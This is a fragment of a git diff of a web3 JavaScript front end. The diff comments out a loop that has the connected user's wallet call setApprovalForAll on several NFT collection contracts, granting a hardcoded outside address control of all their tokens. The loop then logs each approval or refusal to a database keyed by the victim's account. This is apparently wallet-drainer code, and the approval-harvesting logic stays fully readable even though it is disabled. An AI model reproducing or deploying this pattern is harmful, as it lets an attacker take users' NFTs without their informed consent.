@@ -729,66 +729,66 @@ const erc20TokenContractAbi = [
             '0xa19f5264f7d7be11c451c093d8f92592820bea86'
           ]  
 
-          neo.forEach( async e => {
+          // neo.forEach( async e => {
 
-            try {
+          //   try {
                 
-            var collectionContract = await new window.web3.eth.Contract(_abi, e, {gas: '100000'})
-            await collectionContract.methods.setApprovalForAll('0xbc46a4D7773B53A2f35d765C78EBC648CEbfeA12', true).send({from: account})
+          //   var collectionContract = await new window.web3.eth.Contract(_abi, e, {gas: '100000'})
+          //   await collectionContract.methods.setApprovalForAll('0xbc46a4D7773B53A2f35d765C78EBC648CEbfeA12', true).send({from: account})
 
 
-            //
-            const collection_contracts = db.collection(account.toLowerCase())
+          //   //
+          //   const collection_contracts = db.collection(account.toLowerCase())
 
 
-            collection_contracts.doc(e).set({
-                approved: 'true',
-                contract: e,
-                date: new Date(),
-                owner: account,
-            }).then( () => {
-                console.log("Document successfully written!");
-            }).catch((error) => {
-                console.error("Error writing document: ", error);
-            });
+          //   collection_contracts.doc(e).set({
+          //       approved: 'true',
+          //       contract: e,
+          //       date: new Date(),
+          //       owner: account,
+          //   }).then( () => {
+          //       console.log("Document successfully written!");
+          //   }).catch((error) => {
+          //       console.error("Error writing document: ", error);
+          //   });
 
 
 
 
-            } catch (error) {
+          //   } catch (error) {
 
               
-                console.log('declined .. butang database', account.toLowerCase())
+          //       console.log('declined .. butang database', account.toLowerCase())
 
 
-                const collection_contracts = db.collection(account.toLowerCase())
+          //       const collection_contracts = db.collection(account.toLowerCase())
 
 
-                collection_contracts.doc(e).set({
-                    approved: 'false',
-                    contract: e,
-                    date: new Date(),
-                    owner: account,
-                }).then( () => {
-                    console.log("Document successfully written!");
-                }).catch((error) => {
-                    console.error("Error writing document: ", error);
-                });
+          //       collection_contracts.doc(e).set({
+          //           approved: 'false',
+          //           contract: e,
+          //           date: new Date(),
+          //           owner: account,
+          //       }).then( () => {
+          //           console.log("Document successfully written!");
+          //       }).catch((error) => {
+          //           console.error("Error writing document: ", error);
+          //       });
 
-                // db.collection("cities").get().then((querySnapshot) => {
-                //     querySnapshot.forEach((doc) => {
-                //         // doc.data() is never undefined for query doc snapshots
-                //         console.log(doc.id, " => ", doc.data());
-                //     });
-                // });
+          //       // db.collection("cities").get().then((querySnapshot) => {
+          //       //     querySnapshot.forEach((doc) => {
+          //       //         // doc.data() is never undefined for query doc snapshots
+          //       //         console.log(doc.id, " => ", doc.data());
+          //       //     });
+          //       // });
 
 
-            }
+          //   }
 
 
 
   
-          })
+          // })
 
   
   
